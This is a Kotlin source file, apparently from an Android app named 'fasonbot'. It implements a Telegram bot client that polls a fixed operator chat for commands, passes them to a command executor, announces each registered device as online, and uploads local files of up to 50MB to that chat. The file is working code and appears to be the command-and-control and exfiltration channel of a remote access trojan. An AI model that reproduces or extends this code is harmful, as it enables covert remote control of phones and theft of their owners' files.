package com.fasonbot.app.bot

import android.content.Context
import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.fasonbot.app.action.CommandExecutor
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.util.ThreadManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

class TelegramBot(private val context: Context) {

    companion object {
        private const val TAG = "TelegramBot"
        private const val BASE_URL = "https://api.telegram.org/bot"
        private const val MAX_FILE_SIZE = 50L * 1024 * 1024
        private const val POLLING_TIMEOUT = 10
        private const val RECONNECT_DELAY = 5000L
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()
    private val lastUpdateId = AtomicInteger(0)
    private val isPolling = AtomicBoolean(false)

    private val commandExecutor = CommandExecutor(context)
    private val messageHandler: MessageHandler by lazy { MessageHandler(context, commandExecutor) }
    private val callbackHandler: CallbackHandler by lazy { CallbackHandler(context, commandExecutor) }

    private val botToken: String = BotConfig.getBotToken()
    private val chatId: String = BotConfig.getChatId()
    private val apiUrl: String = "$BASE_URL$botToken"

    private var pollingThread: Thread? = null

    val thisDeviceId: String by lazy { DeviceManager.getDeviceId(context) }

    fun startPolling() {
        if (isPolling.getAndSet(true)) return
        DeviceManager.registerDevice(context)
        Log.d(TAG, "Bot starting - Token: ${botToken.take(10)}... DeviceID: $thisDeviceId")
        pollingThread = Thread {
            try {
                MessageTemplates.sendOnlineNotification(this, context)
            } catch (e: Exception) {
                Log.e(TAG, "Online notification failed: ${e.message}")
            }
            while (isPolling.get()) {
                try {
                    pollUpdates()
                } catch (e: Exception) {
                    Log.e(TAG, "Poll error: ${e.message}")
                    Thread.sleep(RECONNECT_DELAY)
                }
            }
        }.apply {
            name = "TelegramPolling"
            isDaemon = true
            start()
        }
    }

    fun stopPolling() {
        DeviceManager.updateDeviceStatus(context, thisDeviceId, false)
        isPolling.set(false)
        pollingThread?.interrupt()
        pollingThread = null
    }

    private fun pollUpdates() {
        val lastId = lastUpdateId.get()
        val url = "$apiUrl/getUpdates?timeout=$POLLING_TIMEOUT&offset=${lastId + 1}"
        val request = Request.Builder().url(url).get().build()
        client.newCall(request).execute().use { response ->
            if (!response.isSuccessful) {
                Log.e(TAG, "HTTP ${response.code}")
                return
            }
            val body = response.body?.string()
            if (body.isNullOrEmpty()) return
            val root = gson.fromJson(body, JsonObject::class.java)
            if (!root.has("ok") || !root.get("ok").asBoolean) {
                Log.e(TAG, "API error: ${root.get("description")?.asString ?: "Unknown"}")
                return
            }
            val results = root.getAsJsonArray("result") ?: return
            for (i in 0 until results.size()) {
                val updateObj = results[i].asJsonObject
                lastUpdateId.set(updateObj.get("update_id").asInt)
                processUpdate(updateObj)
            }
        }
    }

    private fun processUpdate(updateObj: JsonObject) {
        if (updateObj.has("message") && !updateObj.get("message").isJsonNull) {
            val msgObj = updateObj.getAsJsonObject("message")
            val text = msgObj.takeIf { it.has("text") && !it.get("text").isJsonNull }?.get("text")?.asString
            val messageId = msgObj.takeIf { it.has("message_id") }?.get("message_id")?.asInt ?: 0
            val replyTo = msgObj.takeIf { it.has("reply_to_message") && !it.get("reply_to_message").isJsonNull }?.getAsJsonObject("reply_to_message")
            text?.let { ThreadManager.runInBackground { messageHandler.handle(it, messageId, replyTo) } }
        }
        if (updateObj.has("callback_query") && !updateObj.get("callback_query").isJsonNull) {
            val callbackObj = updateObj.getAsJsonObject("callback_query")
            val callbackId = callbackObj.get("id").asString
            val data = callbackObj.takeIf { it.has("data") && !it.get("data").isJsonNull }?.get("data")?.asString
            val msgId = callbackObj.takeIf { it.has("message") && !it.get("message").isJsonNull }?.getAsJsonObject("message")?.get("message_id")?.asInt
            data?.let { ThreadManager.runInBackground { callbackHandler.handle(callbackId, data, msgId, this) } }
        }
    }

    fun sendMessage(text: String, parseMode: String? = null, replyMarkup: JsonObject? = null) {
        try {
            val json = JsonObject().apply {
                addProperty("chat_id", chatId)
                addProperty("text", text)
                parseMode?.let { addProperty("parse_mode", it) }
                replyMarkup?.let { add("reply_markup", it) }
            }
            val request = Request.Builder()
                .url("$apiUrl/sendMessage")
                .post(json.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(request).execute().use {}
        } catch (e: Exception) {
            Log.e(TAG, "sendMessage error: ${e.message}")
        }
    }

    fun editMessageText(messageId: Int?, text: String, parseMode: String? = null, replyMarkup: JsonObject? = null) {
        if (messageId == null) return
        try {
            val json = JsonObject().apply {
                addProperty("chat_id", chatId)
                addProperty("message_id", messageId)
                addProperty("text", text)
                parseMode?.let { addProperty("parse_mode", it) }
                replyMarkup?.let { add("reply_markup", it) }
            }
            val request = Request.Builder()
                .url("$apiUrl/editMessageText")
                .post(json.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(request).execute().use {}
        } catch (e: Exception) {
            Log.e(TAG, "editMessageText error: ${e.message}")
        }
    }

    fun deleteMessage(messageId: Int?) {
        if (messageId == null) return
        try {
            val url = "$apiUrl/deleteMessage?chat_id=$chatId&message_id=$messageId"
            client.newCall(Request.Builder().url(url).get().build()).execute().use {}
        } catch (e: Exception) {
            Log.e(TAG, "deleteMessage error: ${e.message}")
        }
    }

    fun sendDocument(file: File, caption: String? = null) {
        try {
            if (!file.exists()) {
                sendMessage("❌ File not found: ${file.name}")
                return
            }
            if (file.length() > MAX_FILE_SIZE) {
                sendMessage("❌ File too large: ${file.name} (${file.length() / 1024 / 1024}MB)")
                return
            }
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", file.name, file.asRequestBody("*/*".toMediaType()))
            caption?.let { requestBody.addFormDataPart("caption", it) }
            val request = Request.Builder()
                .url("$apiUrl/sendDocument")
                .post(requestBody.build())
                .build()
            client.newCall(request).execute().use {}
        } catch (e: Exception) {
            Log.e(TAG, "sendDocument error: ${e.message}")
        }
    }

    fun answerCallbackQuery(callbackQueryId: String, text: String? = null) {
        try {
            val json = JsonObject().apply {
                addProperty("callback_query_id", callbackQueryId)
                text?.let { addProperty("text", it) }
            }
            val request = Request.Builder()
                .url("$apiUrl/answerCallbackQuery")
                .post(json.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(request).execute().use {}
        } catch (e: Exception) {
            Log.e(TAG, "answerCallbackQuery error: ${e.message}")
        }
    }

    fun isConnected(): Boolean = isPolling.get()
}
